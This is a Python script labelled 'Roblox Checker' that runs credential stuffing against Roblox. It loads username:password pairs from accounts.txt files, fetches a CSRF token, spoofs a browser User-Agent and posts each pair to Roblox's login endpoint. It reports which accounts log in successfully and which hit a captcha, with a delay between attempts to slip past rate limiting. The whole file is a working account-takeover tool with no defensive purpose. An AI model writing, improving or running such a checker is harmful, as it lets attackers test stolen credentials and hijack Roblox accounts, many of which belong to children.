import requests
import json
import time
import sys
import os
from colorama import init, Fore, Style

init(autoreset=True)

def get_csrf_token(session):
    try:
        response = session.get('https://auth.roblox.com/v2/login')
        return response.headers.get('x-csrf-token')
    except:
        return None

def check_roblox_login(username, password):
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Content-Type': 'application/json',
        'Accept': 'application/json'
    })

    csrf = get_csrf_token(session)
    if not csrf:
        return False, "Failed to get CSRF token"

    session.headers['x-csrf-token'] = csrf

    payload = {
        "ctype": "Username",
        "cvalue": username,
        "password": password
    }

    try:
        response = session.post('https://auth.roblox.com/v2/login', json=payload)
        status = response.status_code
        resp_json = response.json() if response.text else {}

        if status == 200:
            return True, f"{Fore.GREEN}Login successful!{Style.RESET_ALL}"
        elif status == 403:
            errors = resp_json.get('errors', [{}])[0]
            msg = errors.get('message', 'Unknown error')
            if 'robot test' in msg.lower() or 'captcha' in msg.lower():
                return False, f"{Fore.YELLOW}Captcha required{Style.RESET_ALL}"
            elif 'incorrect' in msg.lower():
                return False, f"{Fore.RED}Bad credentials{Style.RESET_ALL}"
            else:
                return False, f"{Fore.RED}Error: {msg}{Style.RESET_ALL}"
        else:
            return False, f"Status {status}"
    except Exception as e:
        return False, f"Exception: {str(e)}"

def find_accounts_file():
    """Find accounts.txt in multiple possible locations"""
    possible_paths = [
        'accounts.txt',
        'accounts(1).txt',
        'usernames/accounts.txt',
        'usernames/accounts(1).txt',
        'data/accounts.txt',
        'data/accounts(1).txt',
        'input/accounts.txt',
        'input/accounts(1).txt',
        os.path.join(os.path.dirname(os.path.abspath(__file__)), 'accounts.txt'),
        os.path.join(os.path.dirname(os.path.abspath(__file__)), 'accounts(1).txt'),
        os.path.join(os.path.dirname(os.path.abspath(__file__)), 'usernames', 'accounts.txt'),
        os.path.join(os.path.dirname(os.path.abspath(__file__)), 'usernames', 'accounts(1).txt'),
    ]

    # Also search in current directory and subdirectories
    for root, dirs, files in os.walk('.'):
        for fname in files:
            if fname in ['accounts.txt', 'accounts(1).txt']:
                path = os.path.join(root, fname)
                print(f"{Fore.YELLOW}Found file: {path}{Style.RESET_ALL}")
                return path

    for path in possible_paths:
        if os.path.exists(path):
            print(f"{Fore.YELLOW}Found file: {path}{Style.RESET_ALL}")
            return path

    return None

def main():
    print(f"{Fore.CYAN}Roblox Checker{Style.RESET_ALL}")
    print(f"{Fore.CYAN}Current directory: {os.getcwd()}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}Files in current dir: {os.listdir('.')}{Style.RESET_ALL}")

    file_path = find_accounts_file()

    if not file_path:
        print(f"{Fore.RED}ERROR: No accounts.txt or accounts(1).txt found!{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Please make sure the file is uploaded to your Render service.{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Expected locations: accounts.txt, usernames/accounts.txt, or accounts(1).txt{Style.RESET_ALL}")
        return

    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            accounts = [line.strip().split(':', 1) for line in f if ':' in line.strip()]
        print(f"{Fore.GREEN}Loaded {len(accounts)} accounts from {file_path}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}Error reading file: {str(e)}{Style.RESET_ALL}")
        return

    for i, (u, p) in enumerate(accounts, 1):
        print(f"[{i}/{len(accounts)}] Checking {u}...")
        success, msg = check_roblox_login(u, p)
        print(f"Result: {msg}")
        time.sleep(6)

if __name__ == "__main__":
    main()
